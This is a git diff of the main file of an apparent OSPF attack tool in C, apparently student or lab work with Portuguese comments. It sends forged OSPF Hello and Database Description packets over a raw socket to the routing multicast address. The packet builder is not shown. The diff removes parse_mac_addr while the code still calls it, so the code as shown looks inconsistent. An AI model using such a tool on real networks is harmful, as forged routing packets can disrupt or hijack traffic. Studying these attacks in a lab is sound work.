@@ -15,7 +15,6 @@
 #include <arpa/inet.h>
 #include "ospf_attack.h"
 
-unsigned char *parse_mac_addr(char *mac_str);
 unsigned char *parse_ip_addr(char *ip_str);
 
 extern int errno;
@@ -36,10 +35,12 @@ int main(int argc, char *argv[]) {
   char *local_mac_str   = argv[3];
   char *local_ip        = argv[4];
   char *dest_mac_str    = argv[5];
+  //APAGAR ?pedro
   char *dest_ip         = "224.0.0.5"; //argv[6];
 
   // Convert input to bytes
   unsigned char *local_mac = parse_mac_addr(local_mac_str);
+  //APAGAR ?pedro
   unsigned char *dest_mac  = parse_mac_addr("01:00:5e:00:00:05");
   int iface_index = atoi(iface_index_str);
 
@@ -58,8 +59,16 @@ int main(int argc, char *argv[]) {
   destAddr.sll_ifindex = iface_index;
   memcpy(&(destAddr.sll_addr), dest_mac, MAC_ADDR_LEN);
 
-  int packet_len = build_hello(buffer, local_mac, local_ip, dest_mac, dest_ip);
-
+                                            /* 0x01 para HELLO e 0x02 para DB description */
+  int packet_len = packet_len = build(buffer, local_mac, local_ip, 0x01); //build_hello(buffer, local_mac, local_ip, dest_mac, dest_ip);
+  if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+    printf("ERROR! sendto() \n");
+    exit(1);
+  }
+  printf("Send success (%d).\n", ret_value);
+  sleep(1);
+                                            /* 0x01 para HELLO e 0x02 para DB description */
+  packet_len = build(buffer, local_mac, local_ip, 0x02);
   if((ret_value = sendto(sock_fd, buffer, packet_len, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
     printf("ERROR! sendto() \n");
     exit(1);
@@ -69,9 +78,3 @@ int main(int argc, char *argv[]) {
   return 0;
 }
 
-// Based on http://stackoverflow.com/a/3409211
-unsigned char *parse_mac_addr(char *mac_str) {
-  unsigned char *result = calloc(MAC_ADDR_LEN, sizeof(unsigned char));
-  sscanf(mac_str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", result, result + 1, result + 2, result + 3, result + 4, result + 5);
-  return result;
-}
